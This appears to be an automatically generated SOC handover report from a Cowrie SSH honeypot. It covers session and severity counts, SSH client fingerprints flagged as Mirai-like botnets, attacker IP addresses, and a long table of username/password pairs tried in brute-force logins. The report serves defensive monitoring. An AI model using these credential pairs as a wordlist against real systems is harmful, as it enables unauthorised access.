# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-05 |
| **Generated At** | 2026-07-05T07:31:41Z |
| **Shift Time** | 07:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1001** |
| Confirmed Threats | **881** |
| False Positives Filtered | **120** (12.0%) |
| Unique Attacker IPs | **93** |
| Countries of Origin | **24** |
| High Severity Cases | **345** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **656** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **380** |
| Unique Credential Pairs | **257** |
| Unique Usernames | **38** |
| Unique Passwords | **141** |
| Successful Auth Pairs | **348** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 136 |
| `admin` | 53 |
| `345gs5662d34` | 32 |
| `git` | 18 |
| `guest` | 16 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 32 |
| `3245gs5662d34` | 32 |
| `admin` | 18 |
| `123456` | 17 |
| `12345678` | 13 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 32 |
| `root` | `3245gs5662d34` | 21 |
| `admin` | `admin` | 9 |
| `root` | `smo@@kkklss` | 7 |
| `support` | `support` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `master` | `master` | `45.198.224.120` | 2026-07-05T02:56:34 |
| `root` | `!root` | `92.118.39.77` | 2026-07-05T03:04:46 |
| `root` | `111111` | `92.118.39.77` | 2026-07-05T03:06:25 |
| `oracle` | `7777777` | `45.198.224.120` | 2026-07-05T03:07:58 |
| `root` | `123123` | `92.118.39.77` | 2026-07-05T03:08:07 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-05T03:08:12 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-05T03:08:12 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-05T03:08:23 |
| `root` | `1234` | `92.118.39.77` | 2026-07-05T03:09:41 |
| `root` | `qweewq` | `185.242.3.195` | 2026-07-05T03:10:46 |
| `root` | `12345` | `92.118.39.77` | 2026-07-05T03:11:15 |
| `root` | `12345678` | `92.118.39.77` | 2026-07-05T03:14:21 |
| `root` | `qweewq` | `10.0.0.73` | 2026-07-05T03:14:33 |
| `root` | `123456789` | `92.118.39.77` | 2026-07-05T03:15:56 |
| `root` | `P@ssw0rd` | `92.118.39.77` | 2026-07-05T03:17:30 |
| `root` | `Password1` | `92.118.39.77` | 2026-07-05T03:19:02 |
| `mark` | `mark` | `45.198.224.120` | 2026-07-05T03:19:26 |
| `root` | `Root123` | `92.118.39.77` | 2026-07-05T03:20:35 |
| `root` | `admin` | `92.118.39.77` | 2026-07-05T03:22:06 |
| `root` | `admin123` | `92.118.39.77` | 2026-07-05T03:23:37 |
| `root` | `alpine` | `92.118.39.77` | 2026-07-05T03:25:10 |
| `root` | `changeme` | `92.118.39.77` | 2026-07-05T03:26:41 |
| `root` | `default` | `92.118.39.77` | 2026-07-05T03:28:13 |
| `root` | `letmein` | `92.118.39.77` | 2026-07-05T03:29:44 |
| `yangliusha16` | `yangliusha16` | `45.198.224.120` | 2026-07-05T03:30:59 |
| `root` | `passw0rd` | `92.118.39.77` | 2026-07-05T03:31:13 |
| `root` | `password` | `92.118.39.77` | 2026-07-05T03:32:44 |
| `root` | `qwerty` | `92.118.39.77` | 2026-07-05T03:34:13 |
| `root` | `r00t` | `92.118.39.77` | 2026-07-05T03:35:45 |
| `support` | `support` | `176.53.159.196` | 2026-07-05T03:37:00 |
| `support` | `support` | `10.0.0.73` | 2026-07-05T03:38:21 |
| `root` | `root123` | `92.118.39.77` | 2026-07-05T03:38:47 |
| `root` | `root@123` | `92.118.39.77` | 2026-07-05T03:40:17 |
| `root` | `Ali123` | `156.245.246.50` | 2026-07-05T03:40:35 |
| `345gs5662d34` | `345gs5662d34` | `156.245.246.50` | 2026-07-05T03:40:39 |
| `root` | `3245gs5662d34` | `156.245.246.50` | 2026-07-05T03:40:40 |
| `root` | `rootme` | `92.118.39.77` | 2026-07-05T03:41:48 |
| `root` | `debian` | `112.53.123.177` | 2026-07-05T03:42:12 |
| `ubuntu` | `asd12345` | `45.198.224.120` | 2026-07-05T03:42:21 |
| `root` | `system` | `92.118.39.77` | 2026-07-05T03:43:19 |
| `root` | `toor` | `92.118.39.77` | 2026-07-05T03:44:50 |
| `root` | `kK123456` | `112.219.151.50` | 2026-07-05T03:45:30 |
| `345gs5662d34` | `345gs5662d34` | `112.219.151.50` | 2026-07-05T03:45:34 |
| `root` | `3245gs5662d34` | `112.219.151.50` | 2026-07-05T03:45:36 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-07-05T03:46:04 |
| `root` | `welcome` | `92.118.39.77` | 2026-07-05T03:46:18 |
| `admin` | `111111` | `92.118.39.77` | 2026-07-05T03:47:48 |
| `admin` | `123123` | `92.118.39.77` | 2026-07-05T03:49:18 |
| `admin` | `1234` | `92.118.39.77` | 2026-07-05T03:50:47 |
| `admin` | `12345` | `92.118.39.77` | 2026-07-05T03:52:15 |
| `root` | `vps` | `45.198.224.120` | 2026-07-05T03:53:43 |
| `admin` | `123456` | `92.118.39.77` | 2026-07-05T03:53:47 |
| `admin` | `12345678` | `92.118.39.77` | 2026-07-05T03:55:13 |
| `xfs` | `123456` | `118.99.114.224` | 2026-07-05T03:55:45 |
| `345gs5662d34` | `345gs5662d34` | `118.99.114.224` | 2026-07-05T03:55:49 |
| `xfs` | `3245gs5662d34` | `118.99.114.224` | 2026-07-05T03:55:51 |
| `admin` | `123456789` | `92.118.39.77` | 2026-07-05T03:56:41 |
| `admin` | `Admin123` | `92.118.39.77` | 2026-07-05T03:58:08 |
| `admin` | `Administrator` | `92.118.39.77` | 2026-07-05T03:59:35 |
| `root` | `!@#QWE123` | `14.103.127.71` | 2026-07-05T04:00:17 |
| `robert` | `admin` | `175.45.204.121` | 2026-07-05T04:00:43 |
| `345gs5662d34` | `345gs5662d34` | `175.45.204.121` | 2026-07-05T04:00:47 |
| `robert` | `3245gs5662d34` | `175.45.204.121` | 2026-07-05T04:00:48 |
| `admin` | `P@ssw0rd` | `92.118.39.77` | 2026-07-05T04:01:00 |
| `root` | `asdf123$%` | `42.240.164.208` | 2026-07-05T04:01:11 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-05T04:01:15 |
| `345gs5662d34` | `345gs5662d34` | `42.240.164.208` | 2026-07-05T04:01:15 |
| `root` | `3245gs5662d34` | `42.240.164.208` | 2026-07-05T04:01:17 |
| `root` | `root123!` | `152.32.239.122` | 2026-07-05T04:01:21 |
| `345gs5662d34` | `345gs5662d34` | `152.32.239.122` | 2026-07-05T04:01:25 |
| `root` | `3245gs5662d34` | `152.32.239.122` | 2026-07-05T04:01:27 |
| `admin` | `access` | `92.118.39.77` | 2026-07-05T04:02:26 |
| `root` | `asdf123$%` | `175.103.54.172` | 2026-07-05T04:02:32 |
| `345gs5662d34` | `345gs5662d34` | `175.103.54.172` | 2026-07-05T04:02:37 |
| `root` | `3245gs5662d34` | `175.103.54.172` | 2026-07-05T04:02:39 |
| `root` | `pokemon12` | `10.0.0.73` | 2026-07-05T04:03:08 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-05T04:03:13 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T04:03:14 |
| `root` | `Abcd!@#$%^` | `62.133.169.58` | 2026-07-05T04:03:39 |
| `345gs5662d34` | `345gs5662d34` | `62.133.169.58` | 2026-07-05T04:03:42 |
| `root` | `3245gs5662d34` | `62.133.169.58` | 2026-07-05T04:03:43 |
| `admin` | `admin` | `92.118.39.77` | 2026-07-05T04:03:55 |
| `admin` | `admin123` | `92.118.39.77` | 2026-07-05T04:05:21 |
| `ubuntu` | `abc#123` | `45.198.224.120` | 2026-07-05T04:05:52 |
| `root` | `12345678` | `2.26.0.248` | 2026-07-05T04:05:52 |
| `root` | `1234567` | `2.26.0.248` | 2026-07-05T04:05:54 |
| `root` | `123456789` | `2.26.0.248` | 2026-07-05T04:05:56 |
| `root` | `1234567890` | `2.26.0.248` | 2026-07-05T04:05:58 |
| `root` | `quality` | `185.242.3.195` | 2026-07-05T04:05:58 |
| `root` | `test` | `2.26.0.248` | 2026-07-05T04:06:01 |
| `admin` | `123456789` | `2.26.0.248` | 2026-07-05T04:06:03 |
| `admin` | `12345678` | `2.26.0.248` | 2026-07-05T04:06:05 |
| `admin` | `1234567` | `2.26.0.248` | 2026-07-05T04:06:07 |
| `admin` | `test` | `2.26.0.248` | 2026-07-05T04:06:09 |
| `user` | `test` | `2.26.0.248` | 2026-07-05T04:06:11 |
| `user` | `123456` | `2.26.0.248` | 2026-07-05T04:06:13 |
| `user` | `12345678` | `2.26.0.248` | 2026-07-05T04:06:15 |
| `support` | `123456` | `2.26.0.248` | 2026-07-05T04:06:17 |
| `guest` | `123456` | `2.26.0.248` | 2026-07-05T04:06:19 |
| `test` | `test` | `2.26.0.248` | 2026-07-05T04:06:21 |
| `john` | `john` | `2.26.0.248` | 2026-07-05T04:06:24 |
| `root` | `toor` | `2.26.0.248` | 2026-07-05T04:06:25 |
| `root` | `root123456` | `2.26.0.248` | 2026-07-05T04:06:27 |
| `root` | `admin` | `2.26.0.248` | 2026-07-05T04:06:32 |
| `root` | `Dd@123456` | `114.111.54.189` | 2026-07-05T04:06:44 |
| `345gs5662d34` | `345gs5662d34` | `114.111.54.189` | 2026-07-05T04:06:48 |
| `root` | `3245gs5662d34` | `114.111.54.189` | 2026-07-05T04:06:50 |
| `admin` | `admin@123` | `92.118.39.77` | 2026-07-05T04:06:50 |
| `justin` | `test` | `136.248.121.226` | 2026-07-05T04:07:00 |
| `345gs5662d34` | `345gs5662d34` | `136.248.121.226` | 2026-07-05T04:07:03 |
| `justin` | `3245gs5662d34` | `136.248.121.226` | 2026-07-05T04:07:04 |
| `admin` | `adminadmin` | `92.118.39.77` | 2026-07-05T04:08:18 |
| `admin` | `qazwsxedc` | `107.175.156.152` | 2026-07-05T04:09:29 |
| `345gs5662d34` | `345gs5662d34` | `107.175.156.152` | 2026-07-05T04:09:31 |
| `admin` | `3245gs5662d34` | `107.175.156.152` | 2026-07-05T04:09:31 |
| `admin` | `letmein` | `92.118.39.77` | 2026-07-05T04:09:46 |
| `admin` | `passw0rd` | `92.118.39.77` | 2026-07-05T04:11:14 |
| `odoo` | `1234` | `209.99.184.143` | 2026-07-05T04:12:28 |
| `345gs5662d34` | `345gs5662d34` | `209.99.184.143` | 2026-07-05T04:12:30 |
| `odoo` | `3245gs5662d34` | `209.99.184.143` | 2026-07-05T04:12:31 |
| `admin` | `password` | `92.118.39.77` | 2026-07-05T04:12:40 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-05T04:12:58 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-05T04:12:59 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-05T04:13:03 |
| `admin` | `password1` | `92.118.39.77` | 2026-07-05T04:14:07 |
| `root` | `ADMINadmin123` | `125.244.114.221` | 2026-07-05T04:15:01 |
| `345gs5662d34` | `345gs5662d34` | `125.244.114.221` | 2026-07-05T04:15:05 |
| `root` | `3245gs5662d34` | `125.244.114.221` | 2026-07-05T04:15:07 |
| `admin` | `qwerty` | `92.118.39.77` | 2026-07-05T04:15:34 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-05T04:15:57 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-05T04:15:57 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-05T04:16:07 |
| `root` | `user123` | `103.114.147.217` | 2026-07-05T04:16:56 |
| `administrator` | `123456` | `92.118.39.77` | 2026-07-05T04:17:00 |
| `345gs5662d34` | `345gs5662d34` | `103.114.147.217` | 2026-07-05T04:17:01 |
| `root` | `3245gs5662d34` | `103.114.147.217` | 2026-07-05T04:17:03 |
| `root` | `user1234` | `45.198.224.120` | 2026-07-05T04:17:58 |
| `administrator` | `P@ssw0rd` | `92.118.39.77` | 2026-07-05T04:18:25 |
| `root` | `user123` | `14.55.144.22` | 2026-07-05T04:19:06 |
| `345gs5662d34` | `345gs5662d34` | `14.55.144.22` | 2026-07-05T04:19:10 |
| `root` | `3245gs5662d34` | `14.55.144.22` | 2026-07-05T04:19:11 |
| `administrator` | `admin` | `92.118.39.77` | 2026-07-05T04:19:51 |
| `administrator` | `administrator` | `92.118.39.77` | 2026-07-05T04:21:18 |
| `administrator` | `password` | `92.118.39.77` | 2026-07-05T04:22:46 |
| `es` | `elasticsearch` | `45.117.179.232` | 2026-07-05T04:24:05 |
| `345gs5662d34` | `345gs5662d34` | `45.117.179.232` | 2026-07-05T04:24:10 |
| `es` | `3245gs5662d34` | `45.117.179.232` | 2026-07-05T04:24:11 |
| `administrator` | `root` | `92.118.39.77` | 2026-07-05T04:24:13 |
| `apache` | `1234` | `92.118.39.77` | 2026-07-05T04:25:40 |
| `apache` | `12345678` | `92.118.39.77` | 2026-07-05T04:27:06 |
| `apache` | `Apache123` | `92.118.39.77` | 2026-07-05T04:28:31 |
| `root` | `toor2013` | `45.198.224.120` | 2026-07-05T04:29:50 |
| `apache` | `admin` | `92.118.39.77` | 2026-07-05T04:29:56 |
| `root` | `1234.asd` | `59.179.31.237` | 2026-07-05T04:31:08 |
| `345gs5662d34` | `345gs5662d34` | `59.179.31.237` | 2026-07-05T04:31:13 |
| `root` | `3245gs5662d34` | `59.179.31.237` | 2026-07-05T04:31:16 |
| `apache` | `apache` | `92.118.39.77` | 2026-07-05T04:31:19 |
| `root` | `d41d8cd98f00b204e9800998ecf8427e` | `46.101.216.224` | 2026-07-05T04:31:38 |
| `345gs5662d34` | `345gs5662d34` | `46.101.216.224` | 2026-07-05T04:31:40 |
| `root` | `3245gs5662d34` | `46.101.216.224` | 2026-07-05T04:31:41 |
| `apache` | `apache@123` | `92.118.39.77` | 2026-07-05T04:32:45 |
| `apache` | `password` | `92.118.39.77` | 2026-07-05T04:34:09 |
| `backup` | `123` | `92.118.39.77` | 2026-07-05T04:35:36 |
| `backup` | `12345678` | `92.118.39.77` | 2026-07-05T04:37:03 |
| `backup` | `backup` | `92.118.39.77` | 2026-07-05T04:38:31 |
| `backup` | `backup123` | `92.118.39.77` | 2026-07-05T04:39:57 |
| `root` | `﻿------fuck------` | `106.74.128.226` | 2026-07-05T04:40:03 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `216.218.206.66` | 2026-07-05T04:41:26 |
| `backup` | `password` | `92.118.39.77` | 2026-07-05T04:41:27 |
| `root` | `1q2w3e4r5` | `45.198.224.120` | 2026-07-05T04:41:35 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.243.38` | 2026-07-05T04:42:16 |
| `*1` | `$4` | `34.156.243.38` | 2026-07-05T04:42:24 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9154` | `34.156.243.38` | 2026-07-05T04:42:26 |
| `developer` | `1` | `92.118.39.77` | 2026-07-05T04:42:54 |
| `developer` | `123` | `92.118.39.77` | 2026-07-05T04:44:20 |
| `developer` | `1234` | `92.118.39.77` | 2026-07-05T04:45:49 |
| `root` | `quality` | `10.0.0.73` | 2026-07-05T04:46:21 |
| `developer` | `12345` | `92.118.39.77` | 2026-07-05T04:47:17 |
| `developer` | `123456` | `92.118.39.77` | 2026-07-05T04:48:43 |
| `mike` | `test123` | `115.190.197.138` | 2026-07-05T04:49:03 |
| `developer` | `1234567` | `92.118.39.77` | 2026-07-05T04:50:08 |
| `developer` | `12345678` | `92.118.39.77` | 2026-07-05T04:51:33 |
| `developer` | `123456789` | `92.118.39.77` | 2026-07-05T04:52:57 |
| `root` | `samsung` | `45.198.224.120` | 2026-07-05T04:53:08 |
| `developer` | `1234567890` | `92.118.39.77` | 2026-07-05T04:54:24 |
| `developer` | `abc123` | `92.118.39.77` | 2026-07-05T04:55:50 |
| `developer` | `admin` | `92.118.39.77` | 2026-07-05T04:57:15 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-05T04:57:53 |
| `developer` | `dev` | `92.118.39.77` | 2026-07-05T04:58:40 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-05T04:59:10 |
| `developer` | `developer` | `92.118.39.77` | 2026-07-05T05:00:09 |
| `developer` | `password` | `92.118.39.77` | 2026-07-05T05:01:35 |
| `git` | `git` | `10.0.0.73` | 2026-07-05T05:02:35 |
| `git` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T05:02:36 |
| `root` | `zz` | `10.0.0.73` | 2026-07-05T05:02:57 |
| `developer` | `qwerty` | `92.118.39.77` | 2026-07-05T05:03:01 |
| `user` | `1111` | `10.0.0.73` | 2026-07-05T05:03:12 |
| `user` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T05:03:18 |
| `docker` | `123` | `92.118.39.77` | 2026-07-05T05:04:28 |
| `root` | `123123123` | `45.198.224.120` | 2026-07-05T05:04:36 |
| `docker` | `123456` | `92.118.39.77` | 2026-07-05T05:05:54 |
| `docker` | `12345678` | `92.118.39.77` | 2026-07-05T05:07:19 |
| `docker` | `123456789` | `92.118.39.77` | 2026-07-05T05:08:43 |
| `root` | `123` | `195.178.110.227` | 2026-07-05T05:09:02 |
| `fs2024` | `fs2024` | `10.0.0.73` | 2026-07-05T05:09:55 |
| `fs2024` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T05:09:58 |
| `docker` | `docker` | `92.118.39.77` | 2026-07-05T05:10:10 |
| `root` | `baseball` | `10.0.0.73` | 2026-07-05T05:10:14 |
| `root` | `1234` | `195.178.110.227` | 2026-07-05T05:10:57 |
| `docker` | `root` | `92.118.39.77` | 2026-07-05T05:11:35 |
| `root` | `12345` | `195.178.110.227` | 2026-07-05T05:12:39 |
| `ec2-user` | `123456` | `92.118.39.77` | 2026-07-05T05:12:59 |
| `ec2-user` | `12345678` | `92.118.39.77` | 2026-07-05T05:14:24 |
| `ec2-user` | `password` | `92.118.39.77` | 2026-07-05T05:15:48 |
| `root` | `1234567` | `195.178.110.227` | 2026-07-05T05:15:50 |
| `root` | `QAZwsx123` | `45.198.224.120` | 2026-07-05T05:15:51 |
| `ftp` | `123` | `92.118.39.77` | 2026-07-05T05:17:14 |
| `root` | `12345678` | `195.178.110.227` | 2026-07-05T05:17:16 |
| `ftp` | `123456` | `92.118.39.77` | 2026-07-05T05:18:41 |
| `root` | `123456789` | `195.178.110.227` | 2026-07-05T05:18:44 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2667` | `34.156.243.38` | 2026-07-05T05:19:02 |
| `ftp` | `admin` | `92.118.39.77` | 2026-07-05T05:20:06 |
| `root` | `1234567890` | `195.178.110.227` | 2026-07-05T05:20:08 |
| `ftp` | `anonymous` | `92.118.39.77` | 2026-07-05T05:21:32 |
| `root` | `123abc` | `195.178.110.227` | 2026-07-05T05:21:36 |
| `ftp` | `ftp` | `92.118.39.77` | 2026-07-05T05:23:00 |
| `root` | `1q2w3e4r` | `195.178.110.227` | 2026-07-05T05:23:06 |
| `ftp` | `ftpuser` | `92.118.39.77` | 2026-07-05T05:24:24 |
| `root` | `P@ssw0rd123` | `195.178.110.227` | 2026-07-05T05:24:32 |
| `git` | `123` | `92.118.39.77` | 2026-07-05T05:25:50 |
| `root` | `abc123` | `195.178.110.227` | 2026-07-05T05:25:58 |
| `git` | `123123` | `92.118.39.77` | 2026-07-05T05:27:14 |
| `ubuntu` | `asdf123456789` | `45.198.224.120` | 2026-07-05T05:27:15 |
| `root` | `admin123` | `195.178.110.227` | 2026-07-05T05:27:32 |
| `git` | `1234` | `92.118.39.77` | 2026-07-05T05:28:38 |
| `root` | `letmein` | `195.178.110.227` | 2026-07-05T05:29:13 |
| `git` | `12345` | `92.118.39.77` | 2026-07-05T05:30:01 |
| `user` | `ubnt` | `43.142.255.221` | 2026-07-05T05:30:16 |
| `root` | `pass123` | `195.178.110.227` | 2026-07-05T05:30:49 |
| `git` | `123456` | `92.118.39.77` | 2026-07-05T05:31:23 |
| `root` | `password` | `195.178.110.227` | 2026-07-05T05:32:19 |
| `git` | `12345678` | `92.118.39.77` | 2026-07-05T05:32:46 |
| `admin` | `admin` | `79.76.58.113` | 2026-07-05T05:33:19 |
| `root` | `password1` | `195.178.110.227` | 2026-07-05T05:33:49 |
| `git` | `123456789` | `92.118.39.77` | 2026-07-05T05:34:14 |
| `root` | `qwerty123` | `195.178.110.227` | 2026-07-05T05:35:19 |
| `git` | `admin` | `92.118.39.77` | 2026-07-05T05:35:41 |
| `root` | `root123` | `195.178.110.227` | 2026-07-05T05:36:45 |
| `root` | `roadrunner` | `222.232.176.7` | 2026-07-05T05:36:53 |
| `345gs5662d34` | `345gs5662d34` | `222.232.176.7` | 2026-07-05T05:36:56 |
| `root` | `3245gs5662d34` | `222.232.176.7` | 2026-07-05T05:36:58 |
| `git` | `code` | `92.118.39.77` | 2026-07-05T05:37:09 |
| `root` | `abc2025` | `106.13.183.241` | 2026-07-05T05:37:42 |
| `345gs5662d34` | `345gs5662d34` | `106.13.183.241` | 2026-07-05T05:37:46 |
| `root` | `3245gs5662d34` | `106.13.183.241` | 2026-07-05T05:37:49 |
| `ubuntu` | `0000` | `185.242.3.195` | 2026-07-05T05:37:54 |
| `root` | `welcome` | `195.178.110.227` | 2026-07-05T05:38:11 |
| `root` | `Ay123456!` | `121.31.210.125` | 2026-07-05T05:38:19 |
| `testing` | `family` | `45.198.224.120` | 2026-07-05T05:38:26 |
| `git` | `git` | `92.118.39.77` | 2026-07-05T05:38:38 |
| `admin` | `123` | `195.178.110.227` | 2026-07-05T05:39:36 |
| `git` | `git123` | `92.118.39.77` | 2026-07-05T05:40:02 |
| `admin` | `1234` | `195.178.110.227` | 2026-07-05T05:41:01 |
| `git` | `github` | `92.118.39.77` | 2026-07-05T05:41:26 |
| `admin` | `12345` | `195.178.110.227` | 2026-07-05T05:42:23 |
| `git` | `gitlab` | `92.118.39.77` | 2026-07-05T05:42:51 |
| `admin` | `123456` | `195.178.110.227` | 2026-07-05T05:43:46 |
| `git` | `passw0rd` | `92.118.39.77` | 2026-07-05T05:44:14 |
| `admin` | `1234567` | `195.178.110.227` | 2026-07-05T05:45:13 |
| `git` | `password` | `92.118.39.77` | 2026-07-05T05:45:37 |
| `admin` | `12345678` | `195.178.110.227` | 2026-07-05T05:46:43 |
| `git` | `qwerty` | `92.118.39.77` | 2026-07-05T05:47:03 |
| `admin` | `123456789` | `195.178.110.227` | 2026-07-05T05:48:11 |
| `guest` | `1` | `92.118.39.77` | 2026-07-05T05:48:27 |
| `admin` | `1234567890` | `195.178.110.227` | 2026-07-05T05:49:43 |
| `ubuntu` | `asd12` | `45.198.224.120` | 2026-07-05T05:49:43 |
| `guest` | `123` | `92.118.39.77` | 2026-07-05T05:49:50 |
| `admin` | `1q2w3e4r` | `195.178.110.227` | 2026-07-05T05:51:09 |
| `guest` | `1234` | `92.118.39.77` | 2026-07-05T05:51:16 |
| `admin` | `P@ssw0rd123` | `195.178.110.227` | 2026-07-05T05:52:33 |
| `guest` | `12345` | `92.118.39.77` | 2026-07-05T05:52:43 |
| `admin` | `abc123` | `195.178.110.227` | 2026-07-05T05:53:55 |
| `guest` | `123456` | `92.118.39.77` | 2026-07-05T05:54:10 |
| `admin` | `admin123` | `195.178.110.227` | 2026-07-05T05:55:18 |
| `guest` | `123456789` | `92.118.39.77` | 2026-07-05T05:55:37 |
| `admin` | `letmein` | `195.178.110.227` | 2026-07-05T05:56:39 |
| `guest` | `1234567890` | `92.118.39.77` | 2026-07-05T05:57:01 |
| `admin` | `pass123` | `195.178.110.227` | 2026-07-05T05:58:02 |
| `guest` | `Guest123` | `92.118.39.77` | 2026-07-05T05:58:25 |
| `admin` | `password` | `195.178.110.227` | 2026-07-05T05:59:24 |
| `guest` | `guest` | `92.118.39.77` | 2026-07-05T05:59:49 |
| `ubuntu` | `q1w2` | `45.198.224.120` | 2026-07-05T06:00:34 |
| `admin` | `password1` | `195.178.110.227` | 2026-07-05T06:00:51 |
| `guest` | `guest123` | `92.118.39.77` | 2026-07-05T06:01:13 |
| `admin` | `qwerty123` | `195.178.110.227` | 2026-07-05T06:02:21 |
| `guest` | `guest@123` | `92.118.39.77` | 2026-07-05T06:02:37 |
| `admin` | `root123` | `195.178.110.227` | 2026-07-05T06:03:52 |
| `guest` | `guestpass` | `92.118.39.77` | 2026-07-05T06:04:01 |
| `admin1` | `123` | `195.178.110.227` | 2026-07-05T06:05:26 |
| `guest` | `password` | `92.118.39.77` | 2026-07-05T06:05:27 |
| `guest` | `qwerty` | `92.118.39.77` | 2026-07-05T06:06:54 |
| `admin1` | `1234` | `195.178.110.227` | 2026-07-05T06:07:01 |
| `guest` | `welcome` | `92.118.39.77` | 2026-07-05T06:08:19 |
| `admin1` | `admin123` | `195.178.110.227` | 2026-07-05T06:08:23 |
| `info` | `123456` | `92.118.39.77` | 2026-07-05T06:09:43 |
| `admin1` | `password1` | `195.178.110.227` | 2026-07-05T06:09:47 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.175.73.73` | 2026-07-05T06:11:01 |
| `admin1` | `qwerty123` | `195.178.110.227` | 2026-07-05T06:11:09 |
| `info` | `admin` | `92.118.39.77` | 2026-07-05T06:11:10 |
| `yangliusha12` | `yangliusha12` | `45.198.224.120` | 2026-07-05T06:11:12 |
| `*1` | `$4` | `207.175.73.73` | 2026-07-05T06:11:15 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9534` | `207.175.73.73` | 2026-07-05T06:11:17 |
| `administrator` | `123` | `195.178.110.227` | 2026-07-05T06:12:30 |
| `info` | `info` | `92.118.39.77` | 2026-07-05T06:12:35 |
| `administrator` | `1234` | `195.178.110.227` | 2026-07-05T06:13:55 |
| `info` | `password` | `92.118.39.77` | 2026-07-05T06:14:02 |
| `administrator` | `123abc` | `195.178.110.227` | 2026-07-05T06:15:19 |
| `jenkins` | `123456` | `92.118.39.77` | 2026-07-05T06:15:25 |
| `administrator` | `1q2w3e4r` | `195.178.110.227` | 2026-07-05T06:16:50 |
| `jenkins` | `Jenkins123` | `92.118.39.77` | 2026-07-05T06:16:50 |
| `root` | `q1w2e3r4R$E#W@Q!` | `10.0.0.73` | 2026-07-05T06:17:58 |
| `jenkins` | `jenkins` | `92.118.39.77` | 2026-07-05T06:18:14 |
| `administrator` | `admin123` | `195.178.110.227` | 2026-07-05T06:18:19 |
| `ubuntu` | `0000` | `10.0.0.73` | 2026-07-05T06:18:20 |
| `root` | `@1qaz2wsx` | `217.154.38.181` | 2026-07-05T06:19:35 |
| `345gs5662d34` | `345gs5662d34` | `217.154.38.181` | 2026-07-05T06:19:37 |
| `root` | `3245gs5662d34` | `217.154.38.181` | 2026-07-05T06:19:38 |
| `jenkins` | `jenkins123` | `92.118.39.77` | 2026-07-05T06:19:38 |
| `administrator` | `qwerty123` | `195.178.110.227` | 2026-07-05T06:19:51 |
| `root` | `Parole12` | `45.198.224.120` | 2026-07-05T06:21:49 |
| `ubuntu` | `upload123456789` | `10.0.0.73` | 2026-07-05T06:27:45 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T06:27:48 |
| `root` | `undertaker` | `201.249.192.30` | 2026-07-05T06:30:37 |
| `345gs5662d34` | `345gs5662d34` | `201.249.192.30` | 2026-07-05T06:30:40 |
| `root` | `3245gs5662d34` | `201.249.192.30` | 2026-07-05T06:30:40 |
| `martha` | `martha` | `45.198.224.120` | 2026-07-05T06:32:38 |
| `root` | `12qwaszX` | `120.48.84.131` | 2026-07-05T06:34:19 |
| `admin` | `admin` | `45.148.10.121` | 2026-07-05T06:34:46 |
| `sales` | `1234` | `45.198.224.120` | 2026-07-05T06:43:39 |
| `admin` | `admin` | `5.253.59.254` | 2026-07-05T06:43:43 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-05T06:43:44 |
| `ubuntu` | `qwedsa@123` | `217.60.3.128` | 2026-07-05T06:52:09 |
| `345gs5662d34` | `345gs5662d34` | `217.60.3.128` | 2026-07-05T06:52:11 |
| `ubuntu` | `3245gs5662d34` | `217.60.3.128` | 2026-07-05T06:52:12 |
| `root` | `punkin` | `40.121.200.75` | 2026-07-05T06:54:10 |
| `345gs5662d34` | `345gs5662d34` | `40.121.200.75` | 2026-07-05T06:54:11 |
| `root` | `3245gs5662d34` | `40.121.200.75` | 2026-07-05T06:54:11 |
| `root` | `Qa123456` | `45.198.224.120` | 2026-07-05T06:55:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1001** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 243 |
| libssh | 99 |
| Paramiko (Python) | 17 |
| Unknown | 1 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 185 | 2 |
| `f555226df196...` | Mirai/variant | 76 | 28 |
| `16443846184e...` | Generic scanner | 47 | 3 |
| `a2de0f306611...` | Mirai/variant | 17 | 3 |
| `03a80b21afa8...` | Modern SSH client | 5 | 2 |

**Top Fingerprints:**

